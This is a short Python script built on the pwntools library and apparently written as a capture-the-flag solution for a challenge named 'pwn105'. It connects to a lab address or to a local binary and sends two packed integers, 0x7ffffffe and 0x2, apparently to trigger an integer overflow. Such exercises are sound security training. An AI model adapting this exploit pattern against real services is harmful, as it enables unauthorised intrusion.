from pwn import *

def exploit(boolean):
    if boolean:
        r = remote('10.10.52.96', 9005)
    else:
        r = process('./pwn105.pwn105')
    
    payload = p64(0x7ffffffe)
    print(payload)
    r.recvuntil(']>> ')
    r.sendline(payload)

    payload = p64(0x2)
    print(payload)
    r.recvuntil(']>> ')
    r.sendline(payload)

exploit(True)